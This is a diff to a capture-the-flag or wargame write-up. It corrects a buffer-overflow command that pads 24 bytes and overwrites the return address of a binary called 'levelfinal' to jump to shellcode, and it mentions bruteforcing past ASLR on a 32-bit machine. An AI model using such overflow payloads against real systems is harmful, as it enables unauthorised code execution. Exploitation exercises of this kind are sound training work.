@@ -502,7 +502,7 @@ SC is located at 0xbfd2fa0f
 ```
 We gather all these informations and write the following command
 ```bash
-./levelfinal `python -c "print 'A'*24 + '\x13\x7e\xd6\xbf'"`
+./levelfinal `python -c "print 'A'*24 + '\x15\xfa\xd2\xbf'"`
 ```
 This probably works without ASLR protection. But here, it is enabled. But we are on a 32 bits machine, and we can simply bruteforce it... To that purpose, let's add some bash around our python command.
 ```bash
